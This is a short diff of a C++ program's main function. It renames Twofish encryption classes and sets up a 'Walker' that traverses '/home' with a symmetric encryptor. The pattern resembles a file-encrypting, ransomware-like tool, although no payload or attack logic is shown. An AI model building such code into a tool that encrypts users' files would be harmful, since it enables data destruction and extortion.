@@ -3,11 +3,11 @@
 
 #include "symmetric.hpp"
 #include "walker.hpp"
-#include "cbctwofish.hpp"
+#include "twofish.hpp"
 
 
 int main(int argc, char **argv) {
-    std::shared_ptr<Symmetric> coolCryptor(std::make_shared<CBCTwofish>());
+    std::shared_ptr<sisyph::Symmetric> coolCryptor(std::make_shared<sisyph::Twofish>());
 
     Walker shadowWalker("/home", coolCryptor);
 
